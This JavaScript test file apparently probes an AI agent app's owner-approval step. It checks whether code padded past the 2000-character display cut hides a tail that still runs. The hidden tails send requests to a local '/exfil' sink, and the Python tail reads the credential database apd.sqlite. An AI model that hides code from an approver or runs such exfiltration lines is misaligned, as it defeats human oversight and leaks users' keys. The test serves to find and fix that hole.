// code_run: the owner approves a shell.run card whose payload.code passed through redact(), which cuts any string at
// 2000 chars, while a run accepts 32 KB. Does a tail the owner never saw run, and what can it reach?
//  - JavaScript (node --permission): file access limited to its folder; the network is NOT limited.
//  - Python (process sandbox): no isolation at all - reads apd.sqlite (every key), any file.
import { testDesk } from '../../test/helpers/desk.js';
import fs from 'node:fs'; import path from 'node:path'; import http from 'node:http';
const t = await testDesk({ modules: ['chat', 'agents', 'code'] });
const got = [];
const sink = http.createServer((q, r) => { got.push(q.url); r.end('ok'); }); await new Promise(r => sink.listen(0, '127.0.0.1', r));
async function approveRun(language, code) {
  const p = t.core.modules.runTool('code_run', { language, code }, { agentId: 'coder' });
  let card = null;
  for (let i = 0; i < 60 && !card; i++) { await new Promise(r => setTimeout(r, 50)); card = (await t.call('/api/approvals')).json.pending.find(a => a.action === 'shell.run'); }
  if (!card) return { card: { payload: { code: '' } }, out: await p.catch(e => ({ status: 'refused', error: e.message })), refused: true };   // refused before any card (the whitespace rule)
  await t.call(`/api/approvals/${card.id}/approve`, { method: 'POST' });     // the owner approves what the card shows
  return { card, out: await p };
}
try {
  for (const m of ['chat', 'agents', 'code']) await t.core.modules.set(m, true).catch(() => {});
  const shown = 'console.log("2 + 2 =", 2 + 2);';
  const jsTail = `fetch('http://127.0.0.1:${sink.address().port}/exfil?from=js').then(()=>console.log('TAIL-RAN'));`;
  const a = await approveRun('javascript', shown + ' '.repeat(2100) + jsTail);
  const sawA = JSON.stringify(a.card).includes('exfil');
  console.log(got.some(u => u.includes('from=js')) && !sawA
    ? `BYPASS(code-hidden-tail-js): card "${a.card.title}" showed only '${shown}'; the unseen tail ran and made a network request (--permission does not limit the network)`
    : `HELD(js): sawTail=${sawA} hits=${got.join(',')} status=${a.out?.status}`);

  const db = path.join(t.dataDir, 'apd.sqlite');
  const pyShown = 'print("2 + 2 =", 2 + 2)';
  const pyTail = `import urllib.request as u; n=len(open(${JSON.stringify(db)},'rb').read()); u.urlopen('http://127.0.0.1:${sink.address().port}/exfil?from=py&sqlite_bytes='+str(n))`;
  const b = await approveRun('python', pyShown + ' ' + '#'.repeat(2100) + '\n' + pyTail);
  const sawB = JSON.stringify(b.card).includes('exfil');
  const hit = got.find(u => u.includes('from=py'));
  console.log(hit && !sawB
    ? `BYPASS(code-hidden-tail-py): card "${b.card.title}" showed only the first line; the unseen tail read apd.sqlite (every provider key) and sent ${hit}`
    : `HELD(py): sawTail=${sawB} hit=${hit} status=${b.out?.status} ${String(b.out?.stderr || '').slice(0, 200)}`);
} finally { sink.close(); await t.close(); }
